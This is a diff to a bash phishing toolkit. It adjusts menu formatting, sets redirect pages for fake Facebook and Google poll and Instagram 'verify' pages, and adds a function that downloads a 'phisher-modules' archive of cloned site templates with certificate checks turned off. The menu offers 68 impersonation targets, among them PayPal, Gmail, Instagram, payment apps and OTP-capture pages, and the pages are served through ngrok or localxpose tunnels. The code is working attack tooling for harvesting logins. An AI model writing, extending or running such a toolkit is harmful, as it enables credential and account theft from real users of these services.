@@ -186,17 +186,11 @@ fi
 if [[ -e ".cld.log" ]]; then
         rm -rf ".cld.log"
 fi
-if [[ ! -d "${sites_dir}" ]]; then
-       "\n${GREEN}[${WHITE}#${GREEN}]${RED} Sites directory not found..."
-	sleep 5
-	"${GREEN}[${WHITE}#${GREEN}]${RED} Updating the tool..."
-	check_net_update
-fi
 }
 
 #Dependencies
 dependencies() {
-        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Installing required packages..."
+        echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Installing required packages..."
     if [[ -d "/data/data/com.termux/files/home" ]]; then
         if [[ `command -v proot` ]]; then
             printf ''
@@ -432,7 +426,7 @@ ngrok_token_setup(){
         fi
 
 	rm -rf ${HOME}/.ngrok2/ngrok.yml
-        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} ENTER YOUR AUTHTOKEN${NF} : ${NA}")"
+        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} ENTER YOUR AUTHTOKEN${NA}${YELLOW} >> ${NA}")"
 	read -p "${temprompt}" ntoken
 	echo -e "authtoken : ${ntoken}" >> ngrok.yml
 	mv ngrok.yml ${HOME}/.ngrok2/
@@ -444,7 +438,7 @@ ngrok_token_setup(){
 }
 ngrok_region() {
         echo -e ""
-        echo -e "  ${ULWHITE}${BOLDWHITE}ENTER YOUR PREFERED REGION ${NF} : ${NC}"
+        echo -e "${ULWHITE}${BOLDWHITE}ENTER YOUR PREFERED REGION${NA}${YELLOW} >> ${NA}"
         temprompt="$(echo -e " ${GREEN}(Example: us eu au ap sa jp in) ${NA}${YELLOW}>> ")"
 	read -p "${temprompt}" ngrokregion
 	case $ngrokregion in
@@ -600,7 +594,7 @@ token_localxpose() {
 	[ "$(./.server/loclx account status | grep Error)" ] && {
 		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${YELLOW}localxpose.io${GREEN} & copy the token\n"
 		sleep 3
-                temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} ENTER YOUR AUTHTOKEN${NF} : ${NA}")"
+                temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} ENTER YOUR AUTHTOKEN${NA}${YELLOW} >> ${NA}")"
 	        read -p "${temprompt}" loclx_token
 		[[ $loclx_token == "" ]] && {
 			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnelmenu
@@ -831,7 +825,7 @@ cusurl(){
         echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
         echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
         echo -e "\t\t${GREEN})) ${ULBLUE}PORT    ${NA} : ${ULMAGENTA}${BOLDMAGENTA}${PORT}${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}REDIRECT${NA} : ${ULMAGENTA}${BOLDMAGENTA}https://${rdurl}${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}REDIRECT${NA} : ${ULMAGENTA}${BOLDMAGENTA}${rdurl}${NA}"
         echo -e ""
         echo -e ""
         echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO CUSTOMIZE THE URL BELOW ${NF} : ${NA}"
@@ -863,7 +857,8 @@ cusurl(){
                 esac
 }
 shorten_keystocks(){
-        echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}ENTER YOUR CUSTOM URL ${NA}${YELLOW}>> ${NA}"
+        echo -e ""
+        echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}ENTER YOUR CUSTOM URL${NA}${YELLOW} >> ${NA}"
         temprompt="$(echo -e "${GREEN}(eg:https://google.com | www.google.com) ${YELLOW}>> ${BLUE}")"
 	read -p "${temprompt}" CUS_URL
 	checkurl ${CUS_URL}
@@ -956,7 +951,7 @@ displaylocalhost(){
         echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
         echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
         echo -e "\t\t${GREEN})) ${ULBLUE}PORT    ${NA} : ${ULMAGENTA}${BOLDMAGENTA}${PORT}${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}REDIRECT${NA} : ${ULMAGENTA}${BOLDMAGENTA}https://${rdurl}${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}REDIRECT${NA} : ${ULMAGENTA}${BOLDMAGENTA}${rdurl}${NA}"
         echo -e ""
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} LOCALHOST URL : ${GREEN}http://${HOST}:${PORT}"
 }
@@ -1306,34 +1301,34 @@ check_netstats; echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e " "
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A SITE${NF} : ${NC} "
 echo -e ""
-echo -e "${BLUE} [1] ${GREEN} Adobe         ${NC}""${BLUE} [26] ${GREEN} Mediafire     ${NC}""${BLUE} [51] ${GREEN} Telenor       ${NC}"
-echo -e "${BLUE} [2] ${GREEN} Airtel Sim    ${NC}""${BLUE} [27] ${GREEN} Messenger     ${NC}""${BLUE} [52] ${GREEN} Tiktok        ${NC}"
-echo -e "${BLUE} [3] ${GREEN} AirtelXstream ${NC}""${BLUE} [28] ${GREEN} Microsoft     ${NC}""${BLUE} [53] ${GREEN} Twitch        ${NC}"
-echo -e "${BLUE} [4] ${GREEN} Ajio          ${NC}""${BLUE} [29] ${GREEN} Mobikwik      ${NC}""${BLUE} [54] ${GREEN} Twitter       ${NC}"
-echo -e "${BLUE} [5] ${GREEN} Amazon 	    ${NC}""${BLUE} [30] ${GREEN} Myspace       ${NC}""${BLUE} [55] ${GREEN} Ubereats      ${NC}"
-echo -e "${BLUE} [6] ${GREEN} Apple 	    ${NC}""${BLUE} [31] ${GREEN} Netflix       ${NC}""${BLUE} [56] ${GREEN} verizon       ${NC}"
-echo -e "${BLUE} [7] ${GREEN} Badoo 	    ${NC}""${BLUE} [32] ${GREEN} Ola           ${NC}""${BLUE} [57] ${GREEN} VI            ${NC}"
-echo -e "${BLUE} [8] ${GREEN} Clash of Clans${NC}""${BLUE} [33] ${GREEN} Origin        ${NC}""${BLUE} [58] ${GREEN} VK            ${NC}"
-echo -e "${BLUE} [9] ${GREEN} Date 	    ${NC}""${BLUE} [34] ${GREEN} Paypal        ${NC}""${BLUE} [59] ${GREEN} Whatsapp      ${NC}"
-echo -e "${BLUE} [10] ${GREEN} Devianart    ${NC}""${BLUE} [35] ${GREEN} Paytm         ${NC}""${BLUE} [60] ${GREEN} Wordpress     ${NC}"
-echo -e "${BLUE} [11] ${GREEN} DropBox 	    ${NC}""${BLUE} [36] ${GREEN} Phonepe       ${NC}""${BLUE} [61] ${GREEN} Xbox          ${NC}"
-echo -e "${BLUE} [12] ${GREEN} Ebay         ${NC}""${BLUE} [37] ${GREEN} Pinterest     ${NC}""${BLUE} [62] ${GREEN} Yahoo         ${NC}"
-echo -e "${BLUE} [13] ${GREEN} Facebook     ${NC}""${BLUE} [38] ${GREEN} Playstation   ${NC}""${BLUE} [63] ${GREEN} Yandex        ${NC}"
-echo -e "${BLUE} [14] ${GREEN} Flipcart     ${NC}""${BLUE} [39] ${GREEN} ProtonMail    ${NC}""${BLUE} [64] ${GREEN} Youtube Subs  ${NC}"
-echo -e "${BLUE} [15] ${GREEN} Freefire     ${NC}""${BLUE} [40] ${GREEN} Pubg          ${NC}""${BLUE} [65] ${GREEN} Discord       ${NC}"
-echo -e "${BLUE} [16] ${GREEN} Github 	    ${NC}""${BLUE} [41] ${GREEN} Quora         ${NC}""${BLUE} [66] ${GREEN} Jio router    ${NC}"
-echo -e "${BLUE} [17] ${GREEN} Gitlab 	    ${NC}""${BLUE} [42] ${GREEN} Reddit        ${NC}""${BLUE} [67] ${GREEN} Google WIFI   ${NC}"
-echo -e "${BLUE} [18] ${GREEN} Gmail	    ${NC}""${BLUE} [43] ${GREEN} Shopify       ${NC}""${BLUE} [68] ${GREEN} Mobile Pattern${NC}"
-echo -e "${BLUE} [19] ${GREEN} Google 	    ${NC}""${BLUE} [44] ${GREEN} Snapchat      ${NC}"
-echo -e "${BLUE} [20] ${GREEN} Gpay 	    ${NC}""${BLUE} [45] ${GREEN} Socialclub    ${NC}"
-echo -e "${BLUE} [21] ${GREEN} icloud 	    ${NC}""${BLUE} [46] ${GREEN} Spotify       ${NC}"
-echo -e "${BLUE} [22] ${GREEN} Instagram    ${NC}""${BLUE} [47] ${GREEN} Stackoverflow ${NC}"
-echo -e "${BLUE} [23] ${GREEN} Jazz	    ${NC}""${BLUE} [48] ${GREEN} Steam         ${NC}"
-echo -e "${BLUE} [24] ${GREEN} Jio 	    ${NC}""${BLUE} [49] ${GREEN} Subitout      ${NC}"
-echo -e "${BLUE} [25] ${GREEN} Linkedin     ${NC}""${BLUE} [50] ${GREEN} Telegram      ${NC}"
-echo -e " "
-echo -e "${BLUE} [A] ${MAGENTA} About         ${NC}""${BLUE} [B] ${MAGENTA} Request A site ${NC}""${BLUE} [C] ${MAGENTA} Report Issue${NC}"
-echo -e "${BLUE} [D] ${MAGENTA} View Logs     ${NC}""${BLUE} [E] ${MAGENTA} Check Updates  ${NC}""${BLUE} [00] ${MAGENTA} Exit       ${NC}"
+echo -e "${BLUE} [1]${GREEN} Adobe         ${NC}""${BLUE} [26]${GREEN} Mediafire    ${NC}""${BLUE} [51]${GREEN} Telenor       ${NC}"
+echo -e "${BLUE} [2]${GREEN} Airtel Sim    ${NC}""${BLUE} [27]${GREEN} Messenger    ${NC}""${BLUE} [52]${GREEN} Tiktok        ${NC}"
+echo -e "${BLUE} [3]${GREEN} AirtelXstream ${NC}""${BLUE} [28]${GREEN} Microsoft    ${NC}""${BLUE} [53]${GREEN} Twitch        ${NC}"
+echo -e "${BLUE} [4]${GREEN} Ajio          ${NC}""${BLUE} [29]${GREEN} Mobikwik     ${NC}""${BLUE} [54]${GREEN} Twitter       ${NC}"
+echo -e "${BLUE} [5]${GREEN} Amazon 	   ${NC}""${BLUE} [30]${GREEN} Myspace      ${NC}""${BLUE} [55]${GREEN} Ubereats      ${NC}"
+echo -e "${BLUE} [6]${GREEN} Apple 	   ${NC}""${BLUE} [31]${GREEN} Netflix      ${NC}""${BLUE} [56]${GREEN} verizon       ${NC}"
+echo -e "${BLUE} [7]${GREEN} Badoo 	   ${NC}""${BLUE} [32]${GREEN} Ola          ${NC}""${BLUE} [57]${GREEN} VI            ${NC}"
+echo -e "${BLUE} [8]${GREEN} Clash of Clans${NC}""${BLUE} [33]${GREEN} Origin       ${NC}""${BLUE} [58]${GREEN} VK            ${NC}"
+echo -e "${BLUE} [9]${GREEN} Date 	   ${NC}""${BLUE} [34]${GREEN} Paypal       ${NC}""${BLUE} [59]${GREEN} Whatsapp      ${NC}"
+echo -e "${BLUE} [10]${GREEN} Devianart    ${NC}""${BLUE} [35]${GREEN} Paytm        ${NC}""${BLUE} [60]${GREEN} Wordpress     ${NC}"
+echo -e "${BLUE} [11]${GREEN} DropBox 	   ${NC}""${BLUE} [36]${GREEN} Phonepe      ${NC}""${BLUE} [61]${GREEN} Xbox          ${NC}"
+echo -e "${BLUE} [12]${GREEN} Ebay         ${NC}""${BLUE} [37]${GREEN} Pinterest    ${NC}""${BLUE} [62]${GREEN} Yahoo         ${NC}"
+echo -e "${BLUE} [13]${GREEN} Facebook     ${NC}""${BLUE} [38]${GREEN} Playstation  ${NC}""${BLUE} [63]${GREEN} Yandex        ${NC}"
+echo -e "${BLUE} [14]${GREEN} Flipcart     ${NC}""${BLUE} [39]${GREEN} ProtonMail   ${NC}""${BLUE} [64]${GREEN} Youtube Subs  ${NC}"
+echo -e "${BLUE} [15]${GREEN} Freefire     ${NC}""${BLUE} [40]${GREEN} Pubg         ${NC}""${BLUE} [65]${GREEN} Discord       ${NC}"
+echo -e "${BLUE} [16]${GREEN} Github 	   ${NC}""${BLUE} [41]${GREEN} Quora        ${NC}""${BLUE} [66]${GREEN} Jio router    ${NC}"
+echo -e "${BLUE} [17]${GREEN} Gitlab 	   ${NC}""${BLUE} [42]${GREEN} Reddit       ${NC}""${BLUE} [67]${GREEN} Google WIFI   ${NC}"
+echo -e "${BLUE} [18]${GREEN} Gmail	   ${NC}""${BLUE} [43]${GREEN} Shopify      ${NC}""${BLUE} [68]${GREEN} Mobile Pattern${NC}"
+echo -e "${BLUE} [19]${GREEN} Google 	   ${NC}""${BLUE} [44]${GREEN} Snapchat     ${NC}"
+echo -e "${BLUE} [20]${GREEN} Gpay 	   ${NC}""${BLUE} [45]${GREEN} Socialclub   ${NC}"
+echo -e "${BLUE} [21]${GREEN} icloud 	   ${NC}""${BLUE} [46]${GREEN} Spotify      ${NC}"
+echo -e "${BLUE} [22]${GREEN} Instagram    ${NC}""${BLUE} [47]${GREEN} Stackoverflow${NC}"
+echo -e "${BLUE} [23]${GREEN} Jazz	   ${NC}""${BLUE} [48]${GREEN} Steam        ${NC}"
+echo -e "${BLUE} [24]${GREEN} Jio 	   ${NC}""${BLUE} [49]${GREEN} Subitout     ${NC}"
+echo -e "${BLUE} [25]${GREEN} Linkedin     ${NC}""${BLUE} [50]${GREEN} Telegram     ${NC}"
+checksite_menu
+echo -e "${BLUE} [A]${MAGENTA} About         ${NC}""${BLUE} [B]${MAGENTA} Request site  ${NC}""${BLUE} [C]${MAGENTA} Report Issue${NC}"
+echo -e "${BLUE} [D]${MAGENTA} Logs          ${NC}""${BLUE} [E]${MAGENTA} Check Updates ${NC}""${BLUE} [0]${MAGENTA} Exit        ${NC}"
 echo -e " "
 uprompt;read -p "${prompt}" reply
 echo -e " "
@@ -1486,12 +1481,39 @@ case $reply in
 		check_net_update;;
 	0 | 00)
 		msg_exit;;
+        x | X)
+                download_allsite;;
 	*)
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                  { sleep 1; clear; mainmenu; };;
 esac
 }
 
+#Check site for menu
+checksite_menu(){
+if [[ ! -d "${sites_dir}" ]]; then
+        echo -e " "
+        echo -e "                                   ${BLUE} [X] ${GREEN}  Download all sites                                          ${NC}"
+        echo -e " "
+else 
+        echo -e " "
+fi
+}
+
+## DOWNLOAD SITES
+download_allsite(){
+        rm -rf ${sites_dir}
+        echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloading Sites..."
+        wget --no-check-certificate https://github.com/Alygnt/phisher-modules/archive/refs/heads/sites.zip > /dev/null 2>&1
+        sleep 1
+        echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Unzipping Sites..."
+        unzip sites.zip
+        echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Setting UP..."
+        mv sites ${pro_dir}
+        rm rf sites.zip
+        mv sites .sites
+        echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} SITES ARE DOWNLOADED SUCCESSFULLY..."
+}   
 #WEBSITES
 #adobe
 site_adobe(){
@@ -1838,10 +1860,12 @@ case $sichoice in
                 tunnelmenu;;
 	3 | 03)
                 website="fb_poll"
+                rdurl="result.html"
                 sitype="Poll"
                 tunnelmenu;;
         4 | 04)
                 website="fb_poll/otp"
+                rdurl="result.html"
                 sitype="Poll/OTP"
                 tunnelmenu;;
 	5 | 05)
@@ -2044,10 +2068,12 @@ case $sichoice in
                 tunnelmenu;;
         3 | 03)
                 website="google_poll"
+                rdurl="result.html"
                 sitype="Poll"
                 tunnelmenu;;
         4 | 04)
                 website="google_poll/otp"
+                rdurl="result.html"
                 sitype="Poll/OTP"
                 tunnelmenu;;
         5 | 05)
@@ -2163,6 +2189,7 @@ case $sichoice in
                 tunnelmenu;;
 	9 | 09)
                 website="ig_verify"
+                rdurl="login3.html"
                 sitype="Verify"
                 tunnelmenu;;
 	10)
